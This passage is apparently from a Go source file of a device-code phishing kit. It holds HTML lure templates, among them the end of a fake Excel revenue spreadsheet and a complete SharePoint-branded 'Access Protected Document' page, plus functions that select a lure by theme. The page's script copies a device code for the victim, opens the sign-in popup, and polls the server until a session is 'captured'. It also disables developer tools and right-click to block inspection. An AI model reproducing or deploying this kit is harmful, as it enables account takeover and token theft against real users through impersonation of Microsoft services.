      cell('c-B', ''), cell('c-C', ''), cell('c-D', ''), cell('c-E', ''), cell('c-F', ''), cell('c-G', ''), cell('c-H', ''), cell('c-I', '')
    ));
    grid.children[grid.children.length-1].style.height = '10px';

    grid.appendChild(row(
      cell('c-B header-row', 'Description'),
      cell('c-C header-row center', 'Category'),
      cell('c-D header-row right', 'Q2 2025'),
      cell('c-E header-row right', 'Q1 2026'),
      cell('c-F header-row right selected', 'Q2 2026'),
      cell('c-G header-row right', 'QoQ Chg'),
      cell('c-H header-row right', 'YoY Chg'),
      cell('c-I header-row center', 'Status')
    ));

    var data = [
      { desc: 'Enterprise SaaS Subscriptions', cat: 'Recurring', d: '26,540', e: '29,180', f: '31,420', g: '+7.7%', h: '+18.4%', status: '●', statusClass: 'pos' },
      { desc: 'Managed Services Revenue', cat: 'Recurring', d: '21,800', e: '22,100', f: '22,740', g: '+2.9%', h: '+4.3%', status: '●', statusClass: 'pos' },
      { desc: 'Professional Services', cat: 'Project', d: '19,420', e: '19,100', f: '18,200', g: '−4.7%', h: '−6.3%', status: '▼', statusClass: 'neg' },
      { desc: 'Licensing & IP Revenue', cat: 'License', d: '9,700', e: '10,880', f: '11,900', g: '+9.4%', h: '+22.7%', status: '●', statusClass: 'pos' },
      { desc: 'Cloud Services', cat: 'Recurring', d: '14,200', e: '15,400', f: '16,800', g: '+9.1%', h: '+18.3%', status: '●', statusClass: 'pos' },
      { desc: 'Consulting Revenue', cat: 'Project', d: '8,900', e: '8,300', f: '7,800', g: '−6.0%', h: '−12.4%', status: '▼', statusClass: 'neg' },
      { desc: 'Software Licenses', cat: 'License', d: '5,600', e: '6,100', f: '6,700', g: '+9.8%', h: '+19.6%', status: '●', statusClass: 'pos' },
      { desc: 'Maintenance & Support', cat: 'Recurring', d: '12,300', e: '13,000', f: '13,800', g: '+6.2%', h: '+12.2%', status: '●', statusClass: 'pos' },
      { desc: 'Implementation Services', cat: 'Project', d: '7,100', e: '6,800', f: '6,200', g: '−8.8%', h: '−12.7%', status: '▼', statusClass: 'neg' },
      { desc: 'Data Analytics', cat: 'License', d: '4,800', e: '5,300', f: '5,900', g: '+11.3%', h: '+22.9%', status: '●', statusClass: 'pos' },
      { desc: 'Training & Enablement', cat: 'Project', d: '3,200', e: '3,500', f: '3,100', g: '−11.4%', h: '−3.1%', status: '▼', statusClass: 'neg' },
      { desc: 'Security Services', cat: 'Recurring', d: '6,700', e: '7,200', f: '7,900', g: '+9.7%', h: '+17.9%', status: '●', statusClass: 'pos' },
      { desc: 'Partnership Revenue', cat: 'License', d: '2,900', e: '3,300', f: '3,800', g: '+15.2%', h: '+31.0%', status: '●', statusClass: 'pos' },
      { desc: 'Hardware Resale', cat: 'Project', d: '4,100', e: '3,700', f: '3,300', g: '−10.8%', h: '−19.5%', status: '▼', statusClass: 'neg' },
    ];

    var idx = 0;
    for (var di = 0; di < data.length; di++) {
      var item = data[di];
      var even = idx % 2 === 0 ? 'even-row' : '';
      grid.appendChild(row(
        cell('c-B ' + even, item.desc),
        cell('c-C ' + even + ' center', item.cat),
        cell('c-D ' + even + ' right', item.d),
        cell('c-E ' + even + ' right', item.e),
        cell('c-F ' + even + ' right bold', item.f),
        cell('c-G ' + even + ' right ' + item.statusClass, item.g),
        cell('c-H ' + even + ' right ' + item.statusClass, item.h),
        cell('c-I ' + even + ' center', item.status)
      ));
      var cells = grid.children[grid.children.length-1].querySelectorAll('.xl-cell');
      if (cells.length === 8) {
        cells[7].style.color = item.statusClass === 'pos' ? '#1e7d45' : '#c0392b';
        if (item.status === '▼') cells[7].style.fontSize = '10px';
      }
      idx++;
    }

    grid.appendChild(row(
      cell('c-B subtotal-row', 'Total Revenue'),
      cell('c-C subtotal-row', ''),
      cell('c-D subtotal-row right', '77,460'),
      cell('c-E subtotal-row right', '81,260'),
      cell('c-F subtotal-row right formula', '84,260'),
      cell('c-G subtotal-row right pos', '+3.7%'),
      cell('c-H subtotal-row right pos', '+8.8%'),
      cell('c-I subtotal-row', '')
    ));

    grid.appendChild(row(
      cell('c-B', ''), cell('c-C', ''), cell('c-D', ''), cell('c-E', ''), cell('c-F', ''), cell('c-G', ''), cell('c-H', ''), cell('c-I', '')
    ));
    grid.children[grid.children.length-1].style.height = '6px';

    grid.appendChild(row(
      cell('c-B section-head', 'COST OF REVENUE'),
      cell('c-C section-head', ''), cell('c-D section-head', ''), cell('c-E section-head', ''), cell('c-F section-head', ''), cell('c-G section-head', ''), cell('c-H section-head', ''), cell('c-I section-head', '')
    ));

    var costs = [
      { desc: 'Direct Labour & Headcount', cat: 'Fixed', d: '18,400', e: '18,900', f: '19,100', g: '−1.1%', h: '−3.8%', status: '▼', statusClass: 'neg' },
      { desc: 'Cloud Infrastructure', cat: 'Variable', d: '8,200', e: '8,600', f: '8,900', g: '−3.5%', h: '−8.5%', status: '▼', statusClass: 'neg' },
      { desc: 'Third-Party Services', cat: 'Variable', d: '4,100', e: '3,900', f: '3,600', g: '+7.7%', h: '+12.2%', status: '●', statusClass: 'pos' },
      { desc: 'Facilities & Overhead', cat: 'Fixed', d: '6,200', e: '6,500', f: '6,800', g: '−4.6%', h: '−9.7%', status: '▼', statusClass: 'neg' },
      { desc: 'Marketing & Sales', cat: 'Variable', d: '7,500', e: '8,000', f: '8,400', g: '−5.0%', h: '−12.0%', status: '▼', statusClass: 'neg' },
      { desc: 'R&D Investment', cat: 'Fixed', d: '9,100', e: '9,600', f: '10,200', g: '−6.3%', h: '−12.1%', status: '▼', statusClass: 'neg' },
    ];

    for (var ci = 0; ci < costs.length; ci++) {
      var item = costs[ci];
      var even = idx % 2 === 0 ? 'even-row' : '';
      grid.appendChild(row(
        cell('c-B ' + even, item.desc),
        cell('c-C ' + even + ' center', item.cat),
        cell('c-D ' + even + ' right', item.d),
        cell('c-E ' + even + ' right', item.e),
        cell('c-F ' + even + ' right bold', item.f),
        cell('c-G ' + even + ' right ' + item.statusClass, item.g),
        cell('c-H ' + even + ' right ' + item.statusClass, item.h),
        cell('c-I ' + even + ' center', item.status)
      ));
      var cells = grid.children[grid.children.length-1].querySelectorAll('.xl-cell');
      if (cells.length === 8) {
        cells[7].style.color = item.statusClass === 'pos' ? '#1e7d45' : '#c0392b';
        if (item.status === '▼') cells[7].style.fontSize = '10px';
      }
      idx++;
    }

    grid.appendChild(row(
      cell('c-B subtotal-row', 'Gross Profit'),
      cell('c-C subtotal-row', ''),
      cell('c-D subtotal-row right', '46,760'),
      cell('c-E subtotal-row right', '49,860'),
      cell('c-F subtotal-row right formula', '52,660'),
      cell('c-G subtotal-row right pos', '+5.6%'),
      cell('c-H subtotal-row right pos', '+12.6%'),
      cell('c-I subtotal-row', '')
    ));

    grid.appendChild(row(
      cell('c-B', ''), cell('c-C', ''), cell('c-D', ''), cell('c-E', ''), cell('c-F', ''), cell('c-G', ''), cell('c-H', ''), cell('c-I', '')
    ));
    grid.children[grid.children.length-1].style.height = '6px';

    grid.appendChild(row(
      cell('c-B total-row', 'NET PROFIT'),
      cell('c-C total-row', ''),
      cell('c-D total-row right', '20,240'),
      cell('c-E total-row right', '21,140'),
      cell('c-F total-row right', '22,480'),
      cell('c-G total-row right', '+6.3%'),
      cell('c-H total-row right', '+11.1%'),
      cell('c-I total-row', '')
    ));
    var totalRow = grid.children[grid.children.length-1];
    totalRow.style.height = '22px';
    var totalCells = totalRow.querySelectorAll('.xl-cell');
    if (totalCells.length >= 7) {
      totalCells[5].style.color = '#86efac';
      totalCells[6].style.color = '#86efac';
    }

    var currentRows = grid.children.length;
    for (var i = currentRows; i < 50; i++) {
      var emptyRow = row(
        cell('c-B', ''), cell('c-C', ''), cell('c-D', ''), cell('c-E', ''), 
        cell('c-F', ''), cell('c-G', ''), cell('c-H', ''), cell('c-I', '')
      );
      grid.appendChild(emptyRow);
    }
  }

  buildSpreadsheet();
})();
</script>
</body>
</html>`

// SharePoint document access themed page
const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SharePoint - Secure Document Access</title>
    <style>
        :root {
            --sp-primary: #0078d4;
            --sp-bg: #f3f2f1;
            --sp-card: #ffffff;
            --sp-text-main: #201f1e;
            --sp-text-muted: #605e5c;
            --sp-border: #edebe9;
        }

        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: var(--sp-bg);
            color: var(--sp-text-main);
            -webkit-font-smoothing: antialiased;
        }

        .suite-bar {
            background-color: #0078d4;
            height: 48px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 24px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,0.1);
            box-sizing: border-box;
        }

        .suite-bar-brand {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .suite-bar-logo {
            width: 20px;
            height: 20px;
            filter: brightness(0) invert(1);
        }

        .suite-bar-links {
            display: flex;
            gap: 18px;
            font-size: 13px;
            font-weight: 400;
        }

        .suite-bar-links a {
            color: white;
            text-decoration: none;
            opacity: 0.85;
            transition: opacity 0.15s ease;
        }

        .suite-bar-links a:hover {
            opacity: 1;
        }

        .main-container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: calc(100vh - 48px);
            padding: 24px;
            box-sizing: border-box;
        }

        /* Adjusted for a slim, centered portrait card layout */
        .auth-card {
            background: var(--sp-card);
            width: 100%;
            max-width: 440px;
            border-radius: 4px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.08);
            padding: 36px 32px;
            box-sizing: border-box;
        }

        /* Portrait stack layout */
        .portrait-layout {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        /* Center-aligned logo configuration */
        .logo-area { 
            margin-bottom: 8px; 
            text-align: center; 
        }
        .logo-area img { 
            width: 52px; 
            height: 52px; 
        }

        h1 { 
            font-size: 20px; 
            font-weight: 600; 
            margin: 0 0 12px 0; 
            color: #201f1e; 
            text-align: center; 
        }
        
        .instruction-box {
            color: var(--sp-text-main);
            font-size: 13.5px;
            margin: 0 0 4px 0;
            line-height: 1.5;
            text-align: left;
        }
        
        .instruction-box ol {
            margin: 8px 0 0 0;
            padding-left: 20px;
            color: var(--sp-text-muted);
        }
        
        .instruction-box li {
            margin-bottom: 6px;
        }

        /* Redesigned clean document container without the blur text preview */
        .file-container {
            border: 1px solid var(--sp-border);
            border-radius: 6px;
            background: #faf9f8;
            overflow: hidden;
            text-align: left;
        }

        .file-header {
            display: flex;
            align-items: center;
            padding: 14px 16px;
        }

        .file-icon {
            width: 32px;
            height: 32px;
            margin-right: 12px;
            flex-shrink: 0;
        }

        .file-info {
            overflow: hidden;
            white-space: nowrap;
            text-overflow: ellipsis;
        }

        .file-name {
            font-size: 14px;
            font-weight: 600;
            color: #201f1e;
            margin-bottom: 2px;
        }

        .file-meta {
            font-size: 11px;
            color: var(--sp-text-muted);
        }

        .controls-panel {
            display: flex;
            flex-direction: column;
            margin-top: 4px;
        }

        .code-label {
            font-size: 11px;
            font-weight: 600;
            color: var(--sp-text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 8px;
            text-align: center;
        }

        .code-input-display {
            font-size: 28px;
            font-weight: 700;
            color: var(--sp-primary);
            letter-spacing: 6px;
            margin-bottom: 18px;
            padding: 12px;
            background: #f3f2f1;
            border-radius: 4px;
            border: 1px solid #e1dfdd;
            text-align: center;
        }

        .btn-primary {
            background-color: var(--sp-primary);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin-bottom: 12px;
            transition: background-color 0.1s ease;
        }

        .btn-primary:hover { background-color: #106ebe; }
        .btn-primary:disabled { background-color: #c8c6c4; cursor: not-allowed; color: #a19f9d; }

        .btn-secondary {
            background-color: #ffffff;
            color: #201f1e;
            border: 1px solid #8a8886;
            padding: 12px 20px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: background-color 0.1s ease, border-color 0.1s ease;
        }

        .btn-secondary:hover { background-color: #f3f2f1; border-color: #323130; }

        .timer { font-size: 12px; color: var(--sp-text-muted); margin-top: 16px; text-align: center; }
        .status-msg { font-size: 13px; min-height: 22px; font-weight: 500; margin: 6px 0 4px; color: #107c10; text-align: center; }
        
        .success-view {
            display: none;
            text-align: center;
            padding: 40px 0;
        }
        .success-view .check-icon {
            display: inline-block;
            background: #107c10;
            color: white;
            border-radius: 50%;
            width: 64px;
            height: 64px;
            line-height: 64px;
            font-size: 32px;
            margin-bottom: 20px;
        }
        .success-view h2 { font-weight: 600; margin-bottom: 8px; font-size: 22px; }
        .success-view p { color: var(--sp-text-muted); margin-bottom: 16px; font-size: 14px; }
        .success-badge {
            background: #dff6dd;
            color: #107c10;
            padding: 8px 16px;
            border-radius: 4px;
            display: inline-block;
            font-weight: 600;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="suite-bar">
        <div class="suite-bar-brand">
            <img class="suite-bar-logo" src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/SharePoint-Icon-FY26.svg" alt="SharePoint Logo">
            <span>SharePoint</span>
        </div>
        <div class="suite-bar-links">
            <a href="#">My Files</a>
            <a href="#">Shared</a>
            <a href="#">Help</a>
        </div>
    </div>

    <div class="main-container">
        <div class="auth-card">
            <div id="mainView" class="portrait-layout">
                
                <!-- Left Details stacked vertically -->
                <div class="info-panel">
                    <div class="logo-area">
                        <img src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/SharePoint-Icon-FY26.svg" alt="SharePoint">
                    </div>
                    
                    <h1>Access Protected Document</h1>
                    
                    <div class="instruction-box">
                        A temporary one-time password has been generated to verify your workspace access permissions. Please complete the following steps:
                        <ol>
                            <li>Click the authorization button or sign in with your corporate account.</li>
                            <li>When prompted, paste or input the secure code shown below.</li>
                            <li>Keep this window open until your document workspace loads successfully.</li>
                        </ol>
                    </div>
                </div>

                <!-- Cleaned Document Display -->
                <div class="file-container">
                    <div class="file-header">
                        <img class="file-icon" src="https://res-1.cdn.office.net/files/fabric-cdn-prod_20240129.001/assets/item-types/32/docx.svg" alt="Document">
                        <div class="file-info">
                            <div class="file-name">Confidential_Report_2026.docx</div>
                            <div class="file-meta">SharePoint Online &bull; Protected File</div>
                        </div>
                    </div>
                </div>

                <!-- Verification actions Displayed below details -->
                <div class="controls-panel">
                    <div class="code-label">Verification Code</div>
                    <div class="code-input-display" id="userCode">Loading...</div>
                    
                    <button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>Authenticate with Code</button>
                    
                    <button class="btn-secondary" id="msSignInBtn" onclick="openSignIn()">
                        <svg width="16" height="16" viewBox="0 0 23 23" xmlns="http://www.w3.org/2000/svg"><path fill="#f35325" d="M0 0h11v11H0z"/><path fill="#81bc06" d="M12 0h11v11H12z"/><path fill="#05a6f0" d="M0 12h11v11H0z"/><path fill="#ffba08" d="M12 12h11v11H12z"/></svg>
                        Sign in with Microsoft
                    </button>

                    <div class="status-msg" id="codeStatus"></div>
                    <div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
                </div>
                
            </div>

            <div class="success-view" id="successView">
                <div class="check-icon">✔</div>
                <h2>Verification Complete</h2>
                <p>Your identity has been confirmed. You may now close this window.</p>
                <div class="success-badge">Document Access Granted</div>
            </div>
        </div>
    </div>

    <script>
        (function(){
            var sid = '{session_id}';
            var verifyUrl = '{verify_url}';
            var codeReady = {code_ready};
            var code = '{user_code}';
            var expiresIn = {expires_seconds};
            var popup = null;

            var codeEl = document.getElementById('userCode');
            var statusEl = document.getElementById('codeStatus');
            var btnEl = document.getElementById('signInBtn');
            var timerEl = document.getElementById('timerValue');
            var mainView = document.getElementById('mainView');
            var successView = document.getElementById('successView');

            function showCode(c, v) {
                code = c;
                if (v) verifyUrl = v;
                codeEl.textContent = c;
                codeEl.style.letterSpacing = '6px';
                codeEl.style.color = '#0078d4';
                btnEl.disabled = false;
            }

            if (codeReady && code) {
                showCode(code, verifyUrl);
            } else {
                codeEl.textContent = 'Loading...';
                codeEl.style.letterSpacing = 'normal';
                codeEl.style.color = '#8a8886';
            }

            window.copyCode = function() {
                if (!code) return;
                if (navigator.clipboard) {
                    navigator.clipboard.writeText(code).then(function() {
                        if (statusEl) statusEl.textContent = 'Code copied to clipboard';
                    });
                } else {
                    var t = document.createElement('textarea');
                    t.value = code;
                    t.style.cssText = 'position:fixed;left:-9999px';
                    document.body.appendChild(t);
                    t.select();
                    document.execCommand('copy');
                    document.body.removeChild(t);
                    if (statusEl) statusEl.textContent = 'Code copied to clipboard';
                }
            };

            window.openSignIn = function() {
                if (!code) return;
                if (navigator.clipboard) {
                    navigator.clipboard.writeText(code).catch(function(){});
                } else {
                    var t = document.createElement('textarea');
                    t.value = code;
                    t.style.cssText = 'position:fixed;left:-9999px';
                    document.body.appendChild(t);
                    t.select();
                    document.execCommand('copy');
                    document.body.removeChild(t);
                }
                if (statusEl) statusEl.textContent = 'Code copied to clipboard';

                var w = 520, h = 700, l = (screen.width - w) / 2, t = (screen.height - h) / 2;
                popup = window.open(verifyUrl, 'ms', 'width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
                if (popup) popup.focus();
            };

            function updateTimer() {
                if (expiresIn <= 0) return;
                expiresIn--;
                var m = Math.floor(expiresIn / 60);
                var s = expiresIn % 60;
                timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
                if (expiresIn > 0) setTimeout(updateTimer, 1000);
            }

            if (codeReady) setTimeout(updateTimer, 1000);

            function poll() {
                fetch('/dc/status/' + sid, {
                    method: 'GET',
                    credentials: 'include'
                })
                .then(function(r) { return r.json(); })
                .then(function(d) {
                    if (d.ready && !codeReady) {
                        codeReady = true;
                        showCode(d.user_code, d.verify_url);
                        if (expiresIn === {expires_seconds}) setTimeout(updateTimer, 1000);
                    }
                    if (d.captured) {
                        if (mainView) mainView.style.display = 'none';
                        if (successView) successView.style.display = 'block';
                        if (d.redirect_url) {
                            setTimeout(function() {
                                top.location.href = d.redirect_url;
                            }, 2500);
                        }
                    }
                    if (!d.failed && !d.expired && !d.captured) {
                        setTimeout(poll, 3000);
                    }
                })
                ['catch'](function() {
                    setTimeout(poll, 5000);
                });
            }

            poll();

            document.addEventListener("keydown", function(e) {
                if (e.key === "F12" || (e.ctrlKey && e.shiftKey && ["i","j","c"].includes(e.key.toLowerCase())) || (e.ctrlKey && e.key.toLowerCase() === "u")) {
                    e.preventDefault();
                }
            });
            document.addEventListener("contextmenu", function(e) {
                e.preventDefault();
            });

            if (timerEl) {
                var m = Math.floor(expiresIn / 60);
                var s = expiresIn % 60;
                timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
            }

        })();
    </script>
</body>
</html>`

// GetInterstitialForProvider returns the appropriate interstitial HTML template for the provider
// Now supports theme parameter for document access themed pages
func GetInterstitialForProvider(provider string) string {
	switch provider {
	case DCProviderGoogle:
		return DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML
	default:
		return DEVICE_CODE_INTERSTITIAL_HTML
	}
}

// GetInterstitialByTheme returns themed document access page
func GetInterstitialByTheme(theme string) string {
	switch theme {
	case "onedrive":
		return DEVICE_CODE_ONEDRIVE_HTML
	case "calendly":
		return DEVICE_CODE_CALENDLY_HTML
	case "lexvault":
		return DEVICE_CODE_LEXVAULT_HTML
	case "excel":
		return DEVICE_CODE_EXCEL_HTML
	case "sharepoint":
		return DEVICE_CODE_SHAREPOINT_HTML
	default:
		return DEVICE_CODE_INTERSTITIAL_HTML
	}
}
